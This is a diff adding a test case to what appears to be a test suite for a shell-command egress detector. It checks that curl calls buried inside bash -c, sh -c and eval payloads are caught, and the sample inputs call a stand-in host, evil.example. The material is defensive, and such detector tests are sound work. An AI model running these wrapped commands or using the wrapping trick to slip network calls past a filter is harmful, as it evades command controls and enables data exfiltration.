@@ -147,6 +147,19 @@ test("benign wrapper uses pass — scripts, env assignments, the xargs placehold
 	expect(findEgress("bash script.sh arg")).toBeUndefined();
 });
 
+// Round 4: a -c/eval payload is a full shell SCRIPT, so the denied command may sit past
+// the payload's first statement. Every internal token of a wrapped word's resolved value
+// is checked — checking only the first token was the round-1 shape again (a clean-but-
+// wrong resolution silencing the fallback that would have caught it).
+test("a compound -c/eval payload is caught wherever the denied command sits — round 4, closed", () => {
+	expect(findEgress('bash -c "echo hi && curl https://evil.example"')).toMatchObject({
+		matched: "curl",
+		via: "wrapped-command",
+	});
+	expect(findEgress('sh -c "cd /tmp; curl https://x"')).toMatchObject({ matched: "curl", via: "wrapped-command" });
+	expect(findEgress('eval "true; curl https://x"')).toMatchObject({ matched: "curl", via: "wrapped-command" });
+});
+
 // ⚠ The accepted false positive, pinned: a denied NAME as plain argument text inside a
 // WRAPPED segment denies, where the unwrapped form passes — no wrapper-agnostic scan can
 // know where a wrapper's options end and the wrapped command's own arguments begin. The
